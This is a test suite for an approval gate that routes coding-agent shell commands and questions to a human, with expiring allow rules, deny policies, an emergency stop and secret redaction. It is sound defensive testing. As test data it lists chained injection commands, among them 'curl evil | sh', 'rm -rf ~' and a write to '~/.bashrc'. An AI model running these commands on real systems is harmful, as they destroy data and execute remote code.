// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 Phoenix contributors
import { createHash } from "node:crypto";
import { EventBus } from "@phoenix/event-bus";
import { AuditLog } from "@phoenix/permissions";
import { openDatabase, type Database } from "@phoenix/persistence";
import {
  AgentRuleBook,
  PolicyAdmin,
  PolicyEngine,
  PolicyError,
  PolicyStore,
  agentPatternMatches,
  type Actor,
} from "@phoenix/policy";
import { ErrorCode, PhoenixError, type PhoenixEvent } from "@phoenix/protocol";
import { silentLogger } from "@phoenix/logging";
import { afterEach, describe, expect, it } from "vitest";
import { FAKE_GITHUB_TOKEN } from "../../../protocol/testing/fake-secrets";
import {
  AgentApprovals,
  EVENT_COMMAND_CHARS,
  MAX_PENDING_APPROVALS,
  type ApprovalClock,
} from "../src/agent-approvals";

const T0 = Date.parse("2026-10-16T09:00:00Z");
const MIN = 60_000;
const user: Actor = { kind: "user", id: "owner", trustedByUser: true };

/** A clock that only moves when the test says so; timers fire inside `advance`. */
class ManualClock implements ApprovalClock {
  private time = T0;
  private timers: { at: number; fn: () => void; live: boolean }[] = [];
  now(): number {
    return this.time;
  }
  after(ms: number, fn: () => void): () => void {
    const timer = { at: this.time + ms, fn, live: true };
    this.timers.push(timer);
    return () => {
      timer.live = false;
    };
  }
  advance(ms: number): void {
    const target = this.time + ms;
    for (;;) {
      const due = this.timers
        .filter((t) => t.live && t.at <= target)
        .sort((a, b) => a.at - b.at)[0];
      if (!due) break;
      due.live = false;
      this.time = due.at;
      due.fn();
    }
    this.time = target;
  }
}

const dbs: Database[] = [];
afterEach(() => {
  for (const db of dbs.splice(0)) db.close();
});

interface Env {
  db: Database;
  clock: ManualClock;
  audit: AuditLog;
  bus: EventBus;
  events: PhoenixEvent[];
  admin: PolicyAdmin;
  rules: AgentRuleBook;
  approvals: AgentApprovals;
  setKill: (engaged: boolean) => void;
  flush: () => Promise<void>;
}

function setup(): Env {
  const db = openDatabase(":memory:");
  dbs.push(db);
  const clock = new ManualClock();
  const audit = new AuditLog(db, () => clock.now());
  const bus = new EventBus();
  const events: PhoenixEvent[] = [];
  bus.subscribe("test", "agent.approval.*", (event) => {
    events.push(event);
  });
  let kill = false;
  const store = new PolicyStore(db);
  const policy = new PolicyEngine({
    store,
    audit,
    isKillSwitchEngaged: () => kill,
    isKnownTool: () => true,
    now: () => clock.now(),
  });
  const admin = new PolicyAdmin({ store, audit, now: () => clock.now() });
  const rules = new AgentRuleBook({ db, audit, now: () => clock.now() });
  const approvals = new AgentApprovals({
    db,
    bus,
    audit,
    policy,
    rules,
    isKillSwitchEngaged: () => kill,
    logger: silentLogger,
    clock,
  });
  return {
    db,
    clock,
    audit,
    bus,
    events,
    admin,
    rules,
    approvals,
    setKill: (v) => {
      kill = v;
    },
    flush: async () => {
      await bus.drain();
    },
  };
}
const request = (over: Record<string, unknown> = {}) => ({
  kind: "permission",
  agent: "claude",
  session_id: "s1",
  project: "/work/phoenix",
  tool: "Bash",
  input_summary: { command: "npm test -- --run" },
  suggestions_ok: true,
  ...over,
});

function pendingOf(env: Env, over: Record<string, unknown> = {}) {
  const created = env.approvals.create(request(over));
  if (created.status !== "pending") throw new Error(`expected pending, got ${created.status}`);
  return created;
}

const failure = (fn: () => unknown): PhoenixError => {
  try {
    fn();
  } catch (err) {
    if (err instanceof PhoenixError) return err;
    throw err;
  }
  throw new Error("expected a PhoenixError");
};

describe("identity, nonce and digest binding", () => {
  it("returns id, nonce, a digest of the canonical request, and an expiry", () => {
    const env = setup();
    const created = pendingOf(env);
    expect(created.id).toMatch(/^apr_[0-9a-f]{24}$/);
    expect(created.nonce).toMatch(/^[0-9a-f]{32}$/);
    expect(created.expires_at).toBe(new Date(T0 + 120_000).toISOString());
    const canonical =
      '{"agent":"claude","input_summary":{"command":"npm test -- --run"},"project":"/work/phoenix","session_id":"s1","tool":"Bash"}';
    expect(created.digest).toBe(createHash("sha256").update(canonical).digest("hex"));
  });

  it("a wait with the wrong nonce, or for an unknown id, is a 404 that reveals nothing", async () => {
    const env = setup();
    const a = pendingOf(env);
    const b = pendingOf(env, { input_summary: { command: "npm test -- --other" } });
    const wrong = [
      { id: a.id, nonce: b.nonce },
      { id: a.id, nonce: "0".repeat(32) },
      { id: a.id, nonce: a.nonce.slice(0, 30) },
      {
        id: a.id,
        nonce: a.nonce.toUpperCase() === a.nonce ? "zz".repeat(16) : a.nonce.toUpperCase(),
      },
      { id: `apr_${"0".repeat(24)}`, nonce: a.nonce },
    ];
    for (const attempt of wrong) {
      const result = await env.approvals.wait(attempt.id, { nonce: attempt.nonce }).then(
        () => "resolved",
        (err: unknown) => (err instanceof PhoenixError ? err.code : "other"),
      );
      expect(result).toBe(ErrorCode.RESOURCE_NOT_FOUND);
    }
    // A decision for B is never delivered to A's waiter, and B's id + B's nonce works.
    env.approvals.decide(b.id, { behavior: "allow" });
    const forB = await env.approvals.wait(b.id, { nonce: b.nonce });
    expect(forB).toMatchObject({ id: b.id, digest: b.digest, status: "decided" });
    const forA = env.approvals.wait(a.id, { nonce: a.nonce, wait_ms: 1000 });
    env.clock.advance(1000);
    expect(await forA).toEqual({ id: a.id, digest: a.digest, status: "pending" });
    expect(a.digest).not.toBe(b.digest);
  });

  it("echoes the creation digest and id on every wait result", async () => {
    const env = setup();
    const a = pendingOf(env);
    const waiting = env.approvals.wait(a.id, { nonce: a.nonce });
    env.approvals.decide(a.id, { behavior: "deny", message: "no" });
    expect(await waiting).toEqual({
      id: a.id,
      digest: a.digest,
      status: "decided",
      decision: { behavior: "deny", message: "no" },
      decided_by: "user",
    });
    expect(await env.approvals.wait(a.id, { nonce: a.nonce })).toMatchObject({
      id: a.id,
      digest: a.digest,
    });
  });
});

describe("validation", () => {
  it("rejects oversized and malformed fields", () => {
    const env = setup();
    const bad: Record<string, unknown>[] = [
      { agent: "Claude" },
      { agent: "a".repeat(25) },
      { session_id: "s".repeat(201) },
      { project: "relative/path" },
      { project: "/" + "p".repeat(1000) },
      { tool: "t".repeat(101) },
      { input_summary: { command: "c".repeat(2001) } },
      { input_summary: { path: "p".repeat(1001) } },
      { input_summary: { description: "d".repeat(501) } },
      { input_summary: { command: "x", extra: 1 } },
      { timeout_ms: 4_999 },
      { timeout_ms: 600_001 },
      { timeout_ms: 1.5 },
      { kind: "other" },
      { unknown_field: true },
      { questions: [{ question: "q", header: "h", options: [{ label: "a" }] }] },
      { kind: "question" },
      { kind: "question", questions: [] },
      {
        kind: "question",
        questions: Array.from({ length: 5 }, (_, i) => ({
          question: `q${i}`,
          header: "h",
          options: [{ label: "a" }],
        })),
      },
    ];
    for (const over of bad) {
      expect(failure(() => env.approvals.create(request(over))).code).toBe(
        ErrorCode.INVALID_REQUEST,
      );
    }
    expect(failure(() => env.approvals.create("nope")).code).toBe(ErrorCode.INVALID_REQUEST);
  });

  it("accepts the documented limits exactly", () => {
    const env = setup();
    const created = env.approvals.create(
      request({
        session_id: "s".repeat(200),
        project: "/" + "p".repeat(999),
        tool: "t".repeat(100),
        input_summary: {
          command: "c".repeat(2000),
          path: "/" + "p".repeat(999),
          description: "d".repeat(500),
        },
        timeout_ms: 600_000,
      }),
    );
    expect(created.status).toBe("pending");
  });
});

describe("single resolution and expiry", () => {
  it("resolves exactly once: the second decision is a 409 and changes nothing", async () => {
    const env = setup();
    const a = pendingOf(env);
    env.approvals.decide(a.id, { behavior: "allow" }, "web");
    const second = failure(() => env.approvals.decide(a.id, { behavior: "deny" }, "desktop"));
    expect(second.code).toBe(ErrorCode.EVENT_DUPLICATE);
    expect(await env.approvals.wait(a.id, { nonce: a.nonce })).toMatchObject({
      decision: { behavior: "allow" },
    });
    expect(env.approvals.history().filter((h) => h.id === a.id)).toHaveLength(1);
    await env.flush();
    expect(env.events.filter((e) => e.event_type === "agent.approval.resolved")).toHaveLength(1);
  });

  it("an unknown id is a 404", () => {
    expect(
      failure(() => setup().approvals.decide(`apr_${"1".repeat(24)}`, { behavior: "allow" })).code,
    ).toBe(ErrorCode.RESOURCE_NOT_FOUND);
  });

  it("expires at timeout_ms: gone from the list, 'expired' to the waiter, 409 to a late decision", async () => {
    const env = setup();
    const a = pendingOf(env, { timeout_ms: 10_000 });
    const waiting = env.approvals.wait(a.id, { nonce: a.nonce, wait_ms: 30_000 });
    env.clock.advance(9_999);
    expect(env.approvals.list()).toHaveLength(1);
    env.clock.advance(1);
    expect(await waiting).toEqual({ id: a.id, digest: a.digest, status: "expired" });
    expect(env.approvals.list()).toEqual([]);
    expect(failure(() => env.approvals.decide(a.id, { behavior: "allow" })).code).toBe(
      ErrorCode.EVENT_DUPLICATE,
    );
    expect(await env.approvals.wait(a.id, { nonce: a.nonce })).toMatchObject({ status: "expired" });
    expect(env.approvals.history()[0]).toMatchObject({
      id: a.id,
      outcome: "expired",
      decided_by: "system",
    });
  });

  it("a wait is a bounded long-poll that returns 'pending' at wait_ms", async () => {
    const env = setup();
    const a = pendingOf(env);
    for (const bad of [0, 30_001, 1.5, "5"]) {
      expect(() => env.approvals.wait(a.id, { nonce: a.nonce, wait_ms: bad })).toThrow(
        PhoenixError,
      );
    }
    const waiting = env.approvals.wait(a.id, { nonce: a.nonce, wait_ms: 2_000 });
    env.clock.advance(1_999);
    env.approvals.decide(a.id, { behavior: "allow" });
    expect(await waiting).toMatchObject({ status: "decided" });
  });

  it("terminal: 'Reply in terminal' ends the wait with status terminal, not a deny", async () => {
    const env = setup();
    const a = pendingOf(env);
    const waiting = env.approvals.wait(a.id, { nonce: a.nonce });
    expect(env.approvals.decide(a.id, { behavior: "deny", terminal: true }, "web").outcome).toBe(
      "terminal",
    );
    expect(await waiting).toEqual({ id: a.id, digest: a.digest, status: "terminal" });
    expect(env.approvals.history()[0]).toMatchObject({ outcome: "terminal", decided_by: "user" });
    const b = pendingOf(env);
    for (const body of [
      { behavior: "allow", terminal: true },
      { behavior: "deny", terminal: false },
      { behavior: "deny", terminal: true, message: "x", always: { ttl_minutes: 5 } },
    ]) {
      expect(failure(() => env.approvals.decide(b.id, body)).code).toBe(ErrorCode.INVALID_REQUEST);
    }
  });
});

describe("questions", () => {
  const questions = [
    {
      question: "Which database?",
      header: "DB",
      options: [{ label: "sqlite" }, { label: "postgres", description: "server" }],
    },
    {
      question: "Which extras?",
      header: "Extras",
      multiSelect: true,
      options: [{ label: "fts" }, { label: "wal" }],
    },
  ];

  it("returns the answers to the waiter, requires every question, and never offers Always", async () => {
    const env = setup();
    const q = env.approvals.create({
      kind: "question",
      agent: "claude",
      session_id: "s1",
      project: "/work/phoenix",
      tool: "AskUserQuestion",
      input_summary: {},
      questions,
    });
    if (q.status !== "pending") throw new Error("expected pending");
    const [listed] = env.approvals.list();
    expect(listed).toMatchObject({ kind: "question", always_ok: false, questions });
    expect(failure(() => env.approvals.decide(q.id, { behavior: "allow" })).code).toBe(
      ErrorCode.INVALID_REQUEST,
    );
    expect(
      failure(() =>
        env.approvals.decide(q.id, {
          behavior: "allow",
          answers: { "Which database?": "sqlite", "Which extras?": "fts,wal", "Made up?": "x" },
        }),
      ).code,
    ).toBe(ErrorCode.INVALID_REQUEST);
    expect(
      failure(() =>
        env.approvals.decide(q.id, {
          behavior: "allow",
          answers: { "Which database?": "sqlite", "Which extras?": "fts" },
          always: { ttl_minutes: 5 },
        }),
      ).code,
    ).toBe(ErrorCode.INVALID_REQUEST);
    env.approvals.decide(q.id, {
      behavior: "allow",
      answers: { "Which database?": "sqlite", "Which extras?": "fts,wal" },
    });
    expect(await env.approvals.wait(q.id, { nonce: q.nonce })).toMatchObject({
      decision: {
        behavior: "allow",
        answers: { "Which database?": "sqlite", "Which extras?": "fts,wal" },
      },
    });
  });

  it("'answers' on a permission request is refused", () => {
    const env = setup();
    const a = pendingOf(env);
    expect(
      failure(() => env.approvals.decide(a.id, { behavior: "allow", answers: { x: "y" } })).code,
    ).toBe(ErrorCode.INVALID_REQUEST);
  });
});

describe("Always rules", () => {
  function allowAlways(env: Env, over: Record<string, unknown> = {}, pattern?: string, ttl = 60) {
    const a = pendingOf(env, over);
    return env.approvals.decide(a.id, {
      behavior: "allow",
      always: { ttl_minutes: ttl, ...(pattern ? { pattern } : {}) },
    });
  }

  it("lists always_ok only for permission requests that opted in and are not critical", () => {
    const env = setup();
    pendingOf(env);
    pendingOf(env, { input_summary: { command: "ls" }, suggestions_ok: false });
    pendingOf(env, { input_summary: { command: "kubectl apply -f prod.yaml" } });
    pendingOf(env, { input_summary: { command: "x *" } });
    pendingOf(env, { input_summary: {} });
    expect(env.approvals.list().map((p) => p.always_ok)).toEqual([
      true,
      false,
      false,
      false,
      false,
    ]);
    expect(env.approvals.list()[0]).not.toHaveProperty("nonce");
  });

  it("is scoped to project, tool and pattern", () => {
    const env = setup();
    const outcome = allowAlways(env, {}, "npm test *");
    expect(outcome.rule).toMatchObject({
      project: "/work/phoenix",
      tool: "Bash",
      pattern: "npm test *",
    });

    const decidedByRule = (over: Record<string, unknown>) => {
      const created = env.approvals.create(request(over));
      return created.status === "decided" ? created.decided_by : created.status;
    };
    expect(decidedByRule({ input_summary: { command: "npm test src/a.test.ts" } })).toBe("rule");
    expect(decidedByRule({ input_summary: { command: "npm test " } })).toBe("rule");
    expect(decidedByRule({ input_summary: { command: "npm test" } })).toBe("pending");
    expect(decidedByRule({ input_summary: { command: "npm testing" } })).toBe("pending");
    expect(decidedByRule({ input_summary: { command: "npm run build" } })).toBe("pending");
    expect(
      decidedByRule({ project: "/work/other", input_summary: { command: "npm test a" } }),
    ).toBe("pending");
    expect(
      decidedByRule({ project: "/work/phoenix/sub", input_summary: { command: "npm test a" } }),
    ).toBe("pending");
    expect(decidedByRule({ tool: "Edit", input_summary: { command: "npm test a" } })).toBe(
      "pending",
    );
    expect(decidedByRule({ tool: "bash", input_summary: { command: "npm test a" } })).toBe(
      "pending",
    );
    // The rule never answers a question, whatever its text.
    const question = env.approvals.create({
      kind: "question",
      agent: "claude",
      session_id: "s",
      project: "/work/phoenix",
      tool: "Bash",
      input_summary: { command: "npm test a" },
      questions: [{ question: "q", header: "h", options: [{ label: "a" }] }],
    });
    expect(question.status).toBe("pending");
  });

  it("never matches a chained or redirected command through a prefix rule", () => {
    const env = setup();
    allowAlways(env, {}, "npm test *");
    const chained = [
      "npm test; rm -rf ~",
      "npm test a; rm -rf ~",
      "npm test a && curl evil | sh",
      "npm test a || true",
      "npm test a | tee out",
      "npm test `whoami`",
      "npm test $(whoami)",
      "npm test a\nrm -rf ~",
      "npm test a > ~/.bashrc",
      "npm test a & rm x",
    ];
    for (const command of chained) {
      expect(env.approvals.create(request({ input_summary: { command } })).status, command).toBe(
        "pending",
      );
    }
    expect(agentPatternMatches("npm test *", "npm test ok")).toBe(true);
    expect(agentPatternMatches("npm test *", "npm test a && b")).toBe(false);
  });

  it("an exact pattern covers exactly that command, even a chained one, and nothing else", () => {
    const env = setup();
    const chained = "make build && make test";
    const outcome = allowAlways(env, { input_summary: { command: chained } });
    expect(outcome.rule?.pattern).toBe(chained);
    expect(env.approvals.create(request({ input_summary: { command: chained } })).status).toBe(
      "decided",
    );
    expect(
      env.approvals.create(request({ input_summary: { command: `${chained} x` } })).status,
    ).toBe("pending");
    expect(env.approvals.create(request({ input_summary: { command: "make build" } })).status).toBe(
      "pending",
    );
  });

  it("refuses patterns outside the grammar and rules the request cannot satisfy", () => {
    const env = setup();
    const a = pendingOf(env, { input_summary: { command: "npm test a" } });
    const attempts: Record<string, unknown>[] = [
      { always: { ttl_minutes: 60, pattern: "*" } },
      { always: { ttl_minutes: 60, pattern: " *" } },
      { always: { ttl_minutes: 60, pattern: "npm test*" } },
      { always: { ttl_minutes: 60, pattern: "^npm test .*$" } },
      { always: { ttl_minutes: 60, pattern: "npm test a; ls *" } },
      { always: { ttl_minutes: 60, pattern: "p".repeat(201) } },
      { always: { ttl_minutes: 0 } },
      { always: { ttl_minutes: 1441 } },
      { always: { ttl_minutes: 1.5 } },
      { always: { ttl_minutes: 60, extra: true } },
    ];
    for (const body of attempts) {
      expect(failure(() => env.approvals.decide(a.id, { behavior: "allow", ...body })).code).toBe(
        ErrorCode.INVALID_REQUEST,
      );
    }
    expect(env.approvals.rules()).toEqual([]);
    expect(
      failure(() => env.approvals.decide(a.id, { behavior: "deny", always: { ttl_minutes: 5 } }))
        .code,
    ).toBe(ErrorCode.INVALID_REQUEST);
    // None of the refusals used up the request: it can still be answered.
    expect(env.approvals.list()).toHaveLength(1);
    env.approvals.decide(a.id, { behavior: "allow", always: { ttl_minutes: 1440 } });
    expect(env.approvals.rules()).toHaveLength(1);
  });

  it("refuses Always for critical risk and for a request that did not opt in", () => {
    const env = setup();
    const critical = pendingOf(env, { input_summary: { command: "terraform apply production" } });
    const optedOut = pendingOf(env, { suggestions_ok: false });
    for (const a of [critical, optedOut]) {
      expect(
        failure(() => env.approvals.decide(a.id, { behavior: "allow", always: { ttl_minutes: 5 } }))
          .code,
      ).toBe(ErrorCode.INVALID_REQUEST);
    }
    // A plain allow of the critical request still works.
    env.approvals.decide(critical.id, { behavior: "allow" });
    expect(env.approvals.rules()).toEqual([]);
  });

  it("does not match a critical command even if a rule's prefix would cover it", () => {
    const env = setup();
    allowAlways(env, { input_summary: { command: "deploy staging" } }, "deploy *");
    expect(
      env.approvals.create(request({ input_summary: { command: "deploy staging" } })).status,
    ).toBe("decided");
    expect(
      env.approvals.create(request({ input_summary: { command: "deploy production" } })).status,
    ).toBe("pending");
  });

  it("expires: after its ttl it no longer matches and is no longer listed", () => {
    const env = setup();
    const outcome = allowAlways(env, {}, "npm test *", 30);
    expect(outcome.rule?.expires_at).toBe(new Date(T0 + 30 * MIN).toISOString());
    const probe = () =>
      env.approvals.create(request({ input_summary: { command: "npm test x" } })).status;
    env.clock.advance(30 * MIN - 1);
    expect(env.approvals.rules()).toHaveLength(1);
    expect(probe()).toBe("decided");
    env.clock.advance(1);
    expect(env.approvals.rules()).toEqual([]);
    expect(probe()).toBe("pending");
  });

  it("is capped at 24 h", () => {
    const env = setup();
    const outcome = allowAlways(env, {}, undefined, 1440);
    const rule = outcome.rule!;
    expect(Date.parse(rule.expires_at) - Date.parse(rule.created_at)).toBe(24 * 60 * MIN);
    expect(() =>
      env.rules.create({
        project: "/p",
        tool: "Bash",
        pattern: "ls",
        ttlMs: 24 * 60 * MIN + 1,
        by: user,
      }),
    ).toThrow(PolicyError);
  });

  it("counts uses and audits create, use and revoke; revoke stops matching", async () => {
    const env = setup();
    const outcome = allowAlways(env, {}, "npm test *");
    const ruleId = outcome.rule!.id;
    for (let i = 0; i < 3; i++)
      env.approvals.create(request({ input_summary: { command: `npm test ${i}` } }));
    expect(env.approvals.rules()[0]).toMatchObject({
      id: ruleId,
      uses: 3,
      created_by: "user:owner",
    });
    env.approvals.revokeRule(ruleId);
    expect(env.approvals.rules()).toEqual([]);
    expect(env.approvals.create(request({ input_summary: { command: "npm test 9" } })).status).toBe(
      "pending",
    );
    const actions = env.audit
      .list({ capabilityId: "agent_approval", limit: 100 })
      .map((e) => e.action);
    expect(failure(() => env.approvals.revokeRule(ruleId)).code).toBe(ErrorCode.RESOURCE_NOT_FOUND);
    expect(actions.filter((a) => a === "agent_approval.rule.created")).toHaveLength(1);
    expect(actions.filter((a) => a === "agent_approval.rule.used")).toHaveLength(3);
    expect(actions.filter((a) => a === "agent_approval.rule.revoked")).toHaveLength(1);
    await env.flush();
    expect(
      env.events.filter((e) => e.event_type === "agent.approval.rule.changed").length,
    ).toBeGreaterThanOrEqual(3);
  });

  it("creating the same scope again refreshes one rule instead of stacking", () => {
    const env = setup();
    allowAlways(env, {}, "npm test *", 10);
    env.clock.advance(5 * MIN);
    env.rules.create({
      project: "/work/phoenix",
      tool: "Bash",
      pattern: "npm test *",
      ttlMs: 60 * MIN,
      by: user,
    });
    const rules = env.approvals.rules();
    expect(rules).toHaveLength(1);
    expect(rules[0]!.expires_at).toBe(new Date(T0 + 65 * MIN).toISOString());
  });

  it("only a trusted user can create or revoke a rule", () => {
    const env = setup();
    const agent: Actor = { kind: "agent", id: "claude", trustedByUser: true };
    expect(() =>
      env.rules.create({ project: "/p", tool: "Bash", pattern: "ls", ttlMs: MIN, by: agent }),
    ).toThrow(expect.objectContaining({ code: "NOT_USER_ACTOR" }));
    expect(() => env.rules.revoke({ ...user, trustedByUser: false }, "arl_x")).toThrow(
      expect.objectContaining({ code: "NOT_USER_ACTOR" }),
    );
    expect(env.audit.list({ limit: 10 }).map((e) => e.action)).toContain(
      "agent_approval.rule.create.refused",
    );
  });
});

describe("policy auto-deny", () => {
  it("a user-created deny rule denies before a human sees it, and is audited", async () => {
    const env = setup();
    env.admin.addRule(user, {
      id: "no-rm-rf",
      effect: "deny",
      description: "never delete recursively",
      match: { tool: "agent_approval.bash", resource: "rm -rf *" },
    });
    const denied = env.approvals.create(request({ input_summary: { command: "rm -rf /tmp/x" } }));
    expect(denied).toMatchObject({
      status: "decided",
      decided_by: "policy",
      decision: { behavior: "deny" },
    });
    expect(denied).not.toHaveProperty("nonce");
    if (denied.status !== "decided") throw new Error("unreachable");
    expect(denied.decision.message).toContain("no-rm-rf");
    expect(env.approvals.list()).toEqual([]);
    const policyAudit = env.audit
      .list({ capabilityId: "agent_approval", limit: 20 })
      .filter((e) => e.action === "policy.decision");
    expect(policyAudit).toHaveLength(1);
    expect(policyAudit[0]).toMatchObject({ decision: "denied" });
    expect(policyAudit[0]!.details.matched).toEqual(["no-rm-rf"]);
    expect(env.approvals.history()[0]).toMatchObject({
      outcome: "deny",
      decided_by: "policy",
      command: "rm -rf /tmp/x",
    });
    await env.flush();
    expect(env.events.map((e) => e.event_type)).toEqual(["agent.approval.resolved"]);

    // Other commands, other tools and other agents' questions are untouched.
    expect(env.approvals.create(request({ input_summary: { command: "ls" } })).status).toBe(
      "pending",
    );
    expect(
      env.approvals.create(request({ tool: "Edit", input_summary: { command: "rm -rf x" } }))
        .status,
    ).toBe("pending");
  });

  it("a deny rule beats an existing Always rule, and there is no built-in deny list", () => {
    const env = setup();
    expect(env.approvals.create(request({ input_summary: { command: "rm -rf /" } })).status).toBe(
      "pending",
    );
    const a = pendingOf(env, { input_summary: { command: "rm -rf build" } });
    env.approvals.decide(a.id, { behavior: "allow", always: { ttl_minutes: 60 } });
    expect(
      env.approvals.create(request({ input_summary: { command: "rm -rf build" } })).status,
    ).toBe("decided");
    env.admin.addRule(user, {
      id: "deny-rm",
      effect: "deny",
      match: { tool: "agent_approval.bash", resource: "rm *" },
    });
    expect(
      env.approvals.create(request({ input_summary: { command: "rm -rf build" } })),
    ).toMatchObject({
      status: "decided",
      decided_by: "policy",
    });
  });

  it("fails closed when the stored policy is unreadable", () => {
    const env = setup();
    env.db
      .prepare(
        "INSERT INTO policy_rules (id, rule, created_by, created_at) VALUES ('bad', '{}', 'x', 'y')",
      )
      .run();
    expect(env.approvals.create(request())).toMatchObject({
      status: "decided",
      decided_by: "policy",
    });
  });
});

describe("emergency stop", () => {
  it("cancels every pending request and makes a new one 'terminal'", async () => {
    const env = setup();
    const a = pendingOf(env);
    const b = pendingOf(env, { input_summary: { command: "ls" } });
    const waiting = env.approvals.wait(a.id, { nonce: a.nonce, wait_ms: 30_000 });
    env.setKill(true);
    env.approvals.cancelAll();
    expect(await waiting).toEqual({ id: a.id, digest: a.digest, status: "cancelled" });
    expect(await env.approvals.wait(b.id, { nonce: b.nonce })).toMatchObject({
      status: "cancelled",
    });
    expect(env.approvals.list()).toEqual([]);
    const created = env.approvals.create(request());
    expect(created).toMatchObject({ status: "terminal", reason: "kill_switch" });
    expect(created).not.toHaveProperty("nonce");
    expect(failure(() => env.approvals.decide(a.id, { behavior: "allow" })).code).toBe(
      ErrorCode.EVENT_DUPLICATE,
    );
    const outcomes = env.approvals.history().map((h) => h.outcome);
    expect(outcomes).toContain("cancelled");
    expect(outcomes).toContain("terminal");
  });

  it("an engaged stop cancels pending requests the next time anyone looks, even without the event", () => {
    const env = setup();
    pendingOf(env);
    env.setKill(true);
    expect(env.approvals.list()).toEqual([]);
    env.setKill(false);
    expect(env.approvals.list()).toEqual([]);
  });

  it("an Always rule does not bypass the stop", () => {
    const env = setup();
    const a = pendingOf(env);
    env.approvals.decide(a.id, { behavior: "allow", always: { ttl_minutes: 60 } });
    env.setKill(true);
    expect(env.approvals.create(request())).toMatchObject({ status: "terminal" });
  });
});

describe("bounded pending", () => {
  it(`holds at most ${MAX_PENDING_APPROVALS} and answers 'terminal' beyond that`, async () => {
    const env = setup();
    for (let i = 0; i < MAX_PENDING_APPROVALS; i++)
      pendingOf(env, { input_summary: { command: `cmd ${i}` } });
    const over = env.approvals.create(request({ input_summary: { command: "one too many" } }));
    expect(over).toMatchObject({ status: "terminal", reason: "too_many_pending" });
    expect(env.approvals.list()).toHaveLength(MAX_PENDING_APPROVALS);
    env.approvals.decide(env.approvals.list()[0]!.id, { behavior: "deny" });
    expect(env.approvals.create(request({ input_summary: { command: "now ok" } })).status).toBe(
      "pending",
    );
    env.clock.advance(120_000);
    expect(env.approvals.list()).toEqual([]);
    expect(env.approvals.create(request()).status).toBe("pending");
  });
});

describe("events and stored text", () => {
  it("event payloads carry at most a 200-character command and never the nonce", async () => {
    const env = setup();
    const command = "echo " + "x".repeat(1900);
    const a = pendingOf(env, { input_summary: { command } });
    env.approvals.decide(a.id, { behavior: "allow" });
    await env.flush();
    const requested = env.events.find((e) => e.event_type === "agent.approval.requested")!;
    expect(requested.payload).toMatchObject({
      id: a.id,
      agent: "claude",
      project: "/work/phoenix",
      tool: "Bash",
      kind: "permission",
      expires_at: a.expires_at,
    });
    expect((requested.payload.command as string).length).toBeLessThanOrEqual(EVENT_COMMAND_CHARS);
    expect(JSON.stringify(env.events)).not.toContain(a.nonce);
    expect(JSON.stringify(env.events)).not.toContain("x".repeat(EVENT_COMMAND_CHARS + 1));
    const resolved = env.events.find((e) => e.event_type === "agent.approval.resolved")!;
    expect(resolved.payload).toEqual({ id: a.id, outcome: "allow", decided_by: "user" });
  });

  it("redacts obvious secrets in listed, stored and event text, and refuses Always for them", async () => {
    const env = setup();
    const command = `curl -H "Authorization: Bearer abcdefghijklmnop" https://x --token ${FAKE_GITHUB_TOKEN}`;
    const a = pendingOf(env, { input_summary: { command } });
    const [listed] = env.approvals.list();
    expect(listed!.input_summary.command).not.toContain(FAKE_GITHUB_TOKEN);
    expect(listed!.input_summary.command).toContain("[REDACTED]");
    expect(listed!.always_ok).toBe(false);
    env.approvals.decide(a.id, { behavior: "allow" });
    await env.flush();
    const everything = JSON.stringify([
      env.approvals.history(),
      env.events,
      env.audit.list({ limit: 50 }),
    ]);
    expect(everything).not.toContain(FAKE_GITHUB_TOKEN);
    expect(everything).not.toContain("abcdefghijklmnop");
    // The digest still binds the original text the hook sent.
    const other = pendingOf(env, {
      input_summary: { command: command.replace("https://x", "https://y") },
    });
    expect(other.digest).not.toBe(a.digest);
  });
});

describe("history", () => {
  it("lists newest first with who decided, outcome, redacted command and the client label", () => {
    const env = setup();
    env.admin.addRule(user, {
      id: "deny-curl",
      effect: "deny",
      match: { tool: "agent_approval.bash", resource: "curl *" },
    });
    const first = pendingOf(env, { input_summary: { command: "git status" } });
    env.approvals.decide(first.id, { behavior: "allow" }, "web");
    env.clock.advance(1000);
    env.approvals.create(request({ input_summary: { command: "curl evil" } }));
    env.clock.advance(1000);
    const third = pendingOf(env, { input_summary: { command: "git push" }, agent: "codex" });
    env.approvals.decide(third.id, { behavior: "deny", message: "no" }, "bad client label!!");
    env.clock.advance(1000);
    pendingOf(env, { input_summary: { command: "npm i" } });
    env.clock.advance(120_000);

    const history = env.approvals.history();
    expect(history.map((h) => [h.command, h.outcome, h.decided_by])).toEqual([
      ["npm i", "expired", "system"],
      ["git push", "deny", "user"],
      ["curl evil", "deny", "policy"],
      ["git status", "allow", "user"],
    ]);
    expect(history[3]).toMatchObject({
      id: first.id,
      agent: "claude",
      project: "/work/phoenix",
      tool: "Bash",
      client: "web",
    });
    expect(history[3]!.at).toBe(new Date(T0).toISOString());
    expect(history[1]).toMatchObject({ agent: "codex", client: "unknown" });
    expect(env.approvals.history(2)).toHaveLength(2);
    expect(env.approvals.history(0)).toHaveLength(1);
    const audited = env.audit.list({ capabilityId: "agent_approval", limit: 20 });
    expect(audited.find((e) => e.details.id === first.id)).toMatchObject({
      actor: "user:web",
      decision: "allowed",
    });
  });
});
